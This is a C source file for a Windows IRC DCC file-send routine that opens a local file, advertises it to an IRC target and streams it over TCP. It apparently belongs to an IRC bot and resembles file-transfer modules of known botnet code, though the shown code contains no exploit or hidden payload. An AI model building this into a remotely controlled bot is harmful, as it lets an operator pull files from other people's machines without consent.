#include "stdafx.h"
#include "extern.h"

DWORD WINAPI DccSend(LPVOID param)
{
	DCCSEND dcc;
	SOCKET dccsock;
	sockaddr_in dccsin;
	int dccport = (rand()%32000)+1024;
	HANDLE hFile;
	unsigned long lame;
	char file[32768];
	int ret;
	unsigned long size, sent, start;

	dcc = *((DCCSEND *)param);
	dccsock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
	if (dccsock == INVALID_SOCKET)
	{
		udpdeb("socket() %s\n",fmterr(WSAGetLastError()));
		return 0;
	}

	dccsin.sin_family = AF_INET;
	dccsin.sin_port = htons(dccport);
	dccsin.sin_addr.s_addr = INADDR_ANY;

	if (bind(dccsock, (const sockaddr *)&dccsin, sizeof(SOCKADDR_IN)) == SOCKET_ERROR)
	{
		udpdeb("bind() %s\n",fmterr(WSAGetLastError()));
		closesocket(dccsock);
		return 0;
	}

	hFile = CreateFile(dcc.file, GENERIC_READ, FILE_SHARE_READ, 0 ,OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL , 0);
	if (hFile == INVALID_HANDLE_VALUE)
	{
		udpdeb("%s\n",FORMATERROR);
		closesocket(dccsock);
		return 0;
	}

	deb("Dcc File opened.\n");
	rawmsg("NOTICE %s :DCC Send %s (%s)\r\n", dcc.target, dcc.sfile, szLocalIP);
	rawmsg("PRIVMSG %s :\1DCC SEND %s %d %d %lu\1\r\n", dcc.target, 
		dcc.sfile, htonl(inet_addr(szLocalIP)), dccport, GetFileSize(hFile,&lame));

	deb("Raw messages sent...\n");
	listen(dccsock, 2);
	fd_set readfd;
	readfd.fd_count = 1;
	readfd.fd_array[0] = dccsock;
	timeval tv = {60,0};
	if (select(0, &readfd, 0,0, &tv) == 0)
	{
		CloseHandle(hFile);
		closesocket(dccsock);
		udpdeb("Dccsend Timed out.\n");
		return 0;
	}
	SOCKET dsock = accept(dccsock, 0, 0);
	if (dsock == INVALID_SOCKET)
	{
		udpdeb("accept() %s.\n",fmterr(WSAGetLastError()));
		closesocket(dccsock);
		return 0;
	}
	udpdeb("Transfer accepted. Sending ...\n");
	closesocket(dccsock);
	size = GetFileSize(hFile,&lame);
	sent = 0;
	start = GetTickCount();
	while (TRUE)
	{
		ret = ReadFile(hFile, file, sizeof(file), &lame, NULL);
		if (ret != 0)
		{
			if (send(dsock, file, lame, 0) == SOCKET_ERROR)
			{
				udpdeb("Send() %s\n",fmterr(WSAGetLastError()));
				closesocket(dccsock);
				closesocket(dsock);
				return 0;
			}
			sent = sent + lame;
			if (sent == size) break;
		}
		if (ret == 0) break;
	}
	Sleep(500);
	CloseHandle(hFile);
	closesocket(dsock);
	closesocket(dccsock);
	udpdeb("Sent %s to %s. (%d bytes).\r\n", dcc.sfile, dcc.target, sent);
	return 0;
}